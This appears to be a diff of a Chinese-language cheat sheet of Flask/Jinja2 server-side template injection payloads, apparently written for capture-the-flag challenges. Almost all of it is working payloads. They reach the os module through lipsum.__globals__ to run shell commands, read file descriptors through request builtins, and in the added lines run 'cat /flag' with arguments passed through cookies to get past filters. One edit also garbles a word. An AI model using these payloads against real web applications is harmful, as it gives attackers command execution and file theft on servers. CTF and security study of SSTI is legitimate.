@@ -18,7 +18,7 @@ get_flashed_messages flask的一个方法，可以用于得到__builtins__，而
 lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
 current_app          应用上下文，一个全局变量。
 
-request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，d样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
 request.args.x1   	 get传参
 request.values.x1 	 所有参数
 request.cookies      cookies参数
@@ -234,6 +234,11 @@ cookie:a=__globals__;b=cat /flag
 用{% 继续传参绕过
 ```
 ?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
+```
+```
+?name={% print(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read() %}
+
+Cookie:a=__globals__;b=os;c=cat /flag
 ```
 
 
